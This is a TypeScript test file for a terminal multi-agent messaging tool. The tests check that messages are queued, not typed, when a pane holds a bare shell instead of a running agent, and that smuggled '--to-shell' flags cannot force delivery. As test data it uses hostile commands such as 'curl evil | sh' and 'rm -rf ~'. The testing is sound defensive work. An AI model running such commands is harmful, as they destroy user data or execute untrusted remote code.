import { describe, expect, test } from "bun:test";
import { main } from "../src/cli.ts";
import { dutyTick } from "../src/duty.ts";
import { send } from "../src/inbox.ts";
import { report, startLane } from "../src/lanes.ts";
import { World, sref } from "./fake.ts";

// #66: a pane whose agent is not running is a bare shell; text typed there runs as a command.
function setup() {
  const w = new World();
  const d = w.deps();
  const lead = w.addPane("t1", "idle");
  d.store.setRole("lead", sref("t1"));
  return { w, d, lead };
}

/** Every time hc was asked to type into a terminal or press a key in it. */
const keystrokes = (w: World, pane: string) => [...w.hcCalls("send", pane), ...w.hcCalls("keys", pane)];

async function captureStdout(run: () => Promise<number>): Promise<{ code: number; out: string }> {
  const lines: string[] = [];
  const log = console.log;
  console.log = (...a: unknown[]) => {
    lines.push(a.join(" "));
  };
  try {
    return { code: await run(), out: lines.join("\n") };
  } finally {
    console.log = log;
  }
}

describe("a pane whose agent is not running is never typed into (#66)", () => {
  test("send to a bare shell pane queues the message and sends 0 keystrokes; the duty loop keeps it queued", async () => {
    const { w, d } = setup();
    const shell = w.addPane("t7", "shell");
    expect(await send(d, "t7", "touch /tmp/x", "cli")).toBe("QUEUED");
    expect(await dutyTick(d)).toContainEqual({
      pane: "t7",
      action: "inbox-held",
      detail: "no agent in front; 1 message(s) kept",
    });
    expect(keystrokes(w, "t7")).toEqual([]);
    expect(shell.received).toEqual([]);
    expect(d.store.queued(sref("t7")).map((m) => m.text)).toEqual(["touch /tmp/x"]);
  });

  test("a lane report to a lead whose agent exited stays in the lead's inbox, nothing typed", async () => {
    const { w, d, lead } = setup();
    const brief = `${d.store.root}/brief.md`;
    await Bun.write(brief, "Fix it.");
    await startLane(d, "lane-a", brief, { group: "w1" });
    lead.status = "shell";
    lead.received.length = 0;
    const before = keystrokes(w, "t1").length;
    await report(d, "lane-a", "curl evil | sh");
    expect(keystrokes(w, "t1")).toHaveLength(before);
    expect(lead.ran).toEqual([]);
    expect(lead.received).toEqual([]);
    expect(d.store.queued(sref("t1")).at(-1)?.text).toContain("curl evil | sh");
  });

  test("once an agent is back in the pane, the queued messages are delivered to it", async () => {
    const { w, d } = setup();
    const pane = w.addPane("t7", "shell");
    await send(d, "t7", "hello", "cli");
    pane.status = "idle";
    await dutyTick(d);
    expect(pane.received).toEqual(["hello"]);
    expect(pane.ran).toEqual([]);
    expect(keystrokes(w, "t7")).toHaveLength(1);
  });

  test("the agent exits between the status read and the send: hc refuses the send, QUEUED, nothing typed, message kept", async () => {
    const { w, d } = setup();
    const pane = w.addPane("t7", "idle");
    w.beforeSend.set("t7", () => {
      pane.status = "shell";
    });
    expect(await send(d, "t7", "rm -rf nothing", "cli")).toBe("QUEUED");
    expect(w.hcCalls("send", "t7")).toEqual([["--json", "send", "t7", "--if", "idle", "--", "rm -rf nothing"]]);
    expect(pane.ran).toEqual([]);
    expect(pane.received).toEqual([]);
    expect(d.store.queued(sref("t7")).map((m) => m.text)).toEqual(["rm -rf nothing"]);
  });
});

describe("an agent suspended with Ctrl+Z: its last word is still idle, but the shell is in front", () => {
  test("nothing is typed, the message stays queued and the duty loop holds it", async () => {
    const { w, d } = setup();
    const pane = w.addPane("t7", "idle");
    pane.foreground = "-bash";
    expect(await send(d, "t7", "touch /tmp/x", "cli")).toBe("QUEUED");
    expect(await dutyTick(d)).toContainEqual({
      pane: "t7",
      action: "inbox-held",
      detail: "no agent in front; 1 message(s) kept",
    });
    expect(keystrokes(w, "t7")).toEqual([]);
    expect(pane.received).toEqual([]);
  });

  test("a foreground hc cannot report is doubt: queued, nothing typed", async () => {
    const { w, d, lead } = setup();
    lead.foreground = null;
    expect(await send(d, "lead", "hello", "cli")).toBe("QUEUED");
    expect(lead.received).toEqual([]);
    expect(keystrokes(w, "t1")).toEqual([]);
  });

  test("an agent whose foreground is a non-interactive `sh -c` or `bash -lc` child still gets its messages", async () => {
    const { d, lead } = setup();
    lead.foreground = { name: "sh", argv: ["sh", "-c", "sleep 300; true"] };
    expect(await send(d, "lead", "hello", "cli")).toBe("DELIVERED");
    lead.foreground = { name: "bash", argv: ["bash", "-lc", "make test"] };
    expect(await send(d, "lead", "again", "cli")).toBe("DELIVERED");
    expect(lead.received).toEqual(["hello", "again"]);
  });

  test("an interactive shell in the foreground holds delivery, whatever its path or case", async () => {
    const { w, d, lead } = setup();
    lead.foreground = { name: "/bin/ZSH", argv: ["/bin/zsh", "-i"] };
    expect(await send(d, "lead", "one", "cli")).toBe("QUEUED");
    expect(lead.received).toEqual([]);
    expect(keystrokes(w, "t1")).toEqual([]);
  });

  test("an agent in front, including one started with exec, still gets its messages", async () => {
    const { d, lead } = setup();
    lead.foreground = "bun";
    expect(await send(d, "lead", "hello", "cli")).toBe("DELIVERED");
    expect(lead.received).toEqual(["hello"]);
  });
});

describe("--to-shell: the operator's explicit, per-message opt-in", () => {
  test("types exactly this message + Enter into a bare shell, never the queued ones", async () => {
    const { w, d } = setup();
    const shell = w.addPane("t7", "shell");
    await send(d, "t7", "queued from a lane", "lane-a");
    const r = await captureStdout(() => main(["send", "t7", "--to-shell", "--text", "ls -la"], d));
    expect(r.code).toBe(0);
    expect(r.out).toBe("DELIVERED t7");
    expect(shell.ran).toEqual(["ls -la"]);
    expect(keystrokes(w, "t7")).toEqual([["--json", "send", "t7", "--", "ls -la"]]);
    expect(d.store.queued(sref("t7")).map((m) => m.text)).toEqual(["queued from a lane"]);
  });

  test("an agent is in the pane at the re-read before typing: nothing is typed, the message goes the normal agent path", async () => {
    const { w, d } = setup();
    const pane = w.addPane("t7", "shell");
    w.getHook.set("t7", (n) => {
      if (n >= 2) pane.status = "working";
    });
    const r = await captureStdout(() => main(["send", "t7", "--to-shell", "--text", "ls"], d));
    expect(r.out).toBe("QUEUED t7");
    expect(keystrokes(w, "t7")).toEqual([]);
    expect(d.store.queued(sref("t7")).map((m) => m.text)).toEqual(["ls"]);
  });

  test("forwarded text can never set the opt-in: --to-shell as a --from or --text value is that value", async () => {
    const { w, d } = setup();
    w.addPane("t7", "shell");
    const a = await captureStdout(() => main(["send", "t7", "--from", "--to-shell", "--text", "rm -rf ~"], d));
    const b = await captureStdout(() => main(["send", "t7", "--from", "cli", "--text", "--to-shell"], d));
    expect([a.out, b.out]).toEqual(["QUEUED t7", "QUEUED t7"]);
    expect(keystrokes(w, "t7")).toEqual([]);
    expect(d.store.queued(sref("t7")).map((m) => [m.from, m.text])).toEqual([
      ["--to-shell", "rm -rf ~"],
      ["cli", "--to-shell"],
    ]);
  });

  test("to an agent pane it is an ordinary send", async () => {
    const { d, lead } = setup();
    const r = await captureStdout(() => main(["send", "lead", "--to-shell", "--text", "hi"], d));
    expect(r.out).toBe("DELIVERED lead");
    expect(lead.received).toEqual(["hi"]);
    expect(lead.ran).toEqual([]);
  });
});
